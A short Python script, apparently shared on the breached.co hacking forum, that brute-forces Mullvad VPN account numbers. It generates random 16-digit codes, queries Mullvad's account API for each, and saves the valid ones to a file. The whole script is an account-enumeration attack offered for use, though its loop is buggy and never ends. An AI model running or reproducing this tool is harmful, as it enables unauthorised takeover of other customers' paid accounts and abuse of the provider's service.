import requests
import random

def checkcode(code):
    #check if the code is valid with the mullvad api
    url = 'https://api.mullvad.net/www/accounts/' + code
    response = requests.get(url)
    if response.status_code == 200:
        print('\n[+] Valid code found: ' + code)
        with open('valid.txt','a') as file:
            file.write(code)
    else:
        print('\n[-] Invalid code')

def gencheck():
    i = 0
    while i <= 100:
        code = '{0:16}'.format(random.randint(1, 9999999999999999))
        checkcode(code)

def remove(string):
    return string.replace(' ', '')
      
print('made by minori from breached.co' + '\n')


print('option 1 = check code')
print('option 2 = random code generator + checker')

option = input('Enter your choice: ')

if option == '1':
    code = input('Enter your code: ')
    code = remove(code)
    checkcode(code)
elif option == '2':
    gencheck()
